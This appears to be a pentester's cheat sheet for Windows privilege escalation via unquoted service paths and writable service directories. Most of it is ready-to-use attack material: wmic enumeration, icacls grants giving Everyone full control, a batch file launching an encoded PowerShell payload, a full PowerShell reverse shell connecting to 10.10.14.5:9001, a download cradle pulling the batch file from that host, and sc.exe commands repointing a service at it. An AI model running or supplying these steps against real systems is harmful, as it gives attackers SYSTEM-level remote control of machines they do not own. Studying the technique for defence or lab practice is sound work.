# Example:

## Manual Enumeration: cmd /c wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

### C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe

#### If this is unquoted, cmd will search for programs to execute like:

### C:\MyPrograms\Disk.exe

### C:\MyPrograms\Disk Sorter.exe

#### 1: Check permissions on directories with icacls.

    icacls .

#### You can also use a tool named Get-ServiceAcl powershell script https://github.com/Sambal0x/tools/blob/master/Get-ServiceAcl.ps1

    Get-ServiceAcl.ps1

    "SERVICE_NAME" | Get-ServiceAcl | select -ExpandProperty Access

#### If BUILTIN/Users has (AI) and (WD), a user is allowed to create subdirectories and files respectively.

#### 2: msfvenom payload

#### 3: Rename payload to one of the arguments then grant it (F) permissions with icacls

     icacls "c:\path\to\service.exe" /grant Everyone:F

## OR 

#### Write a batch file (runme.bat) that the service will execute

#### Write runme.bat with UTF-16LE and base64 encoding for padding.

      @echo off
      start /b powershell.exe -exec bypass -enc <base64_encoded_payload> 
      exit /b

#### Base54 encoded payload

      $client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

#### 4: Create a temp directory

      mkdir temp

      cd c:\temp

#### 5: Upload the batch file on target machine

      (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5:9999/runme.bat','c:\temp\runme.bat')

#### 6: Setup listener

#### 7: Restart service

      sc.exe stop SERVICE_NAME

      sc.exe config SERVICE_NAME binPath="cmd.exe /c c:\temp\runme.bat"

      sc.exe qc SERVICE_NAME

      sc.exe start SERVICE_NAME
